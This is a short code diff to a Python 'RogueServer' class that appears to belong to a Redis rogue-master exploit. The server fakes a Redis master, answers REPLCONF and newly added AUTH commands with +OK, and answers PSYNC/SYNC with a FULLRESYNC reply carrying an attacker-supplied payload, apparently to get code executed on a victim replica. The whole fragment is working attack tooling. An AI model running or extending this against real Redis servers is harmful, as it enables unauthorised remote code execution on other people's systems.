@@ -115,12 +115,15 @@ class RogueServer:
         elif data.find("REPLCONF") > -1:
             resp = "+OK" + CLRF
             phase = 2
+        elif data.find("AUTH") > -1:
+            resp = "+OK" + CLRF
+            phase = 3
         elif data.find("PSYNC") > -1 or data.find("SYNC") > -1:
             resp = "+FULLRESYNC " + "Z" * 40 + " 0" + CLRF
             resp += "$" + str(len(payload)) + CLRF
             resp = resp.encode()
             resp += payload + CLRF.encode()
-            phase = 3
+            phase = 4
         return resp, phase
 
     def close(self):
@@ -136,7 +139,7 @@ class RogueServer:
                     break
                 resp, phase = self.handle(data)
                 dout(cli, resp)
-                if phase == 3:
+                if phase == 4:
                     break
         except Exception as e:
             print("\033[1;31;m[-]\033[0m Error: {}, exit".format(e))
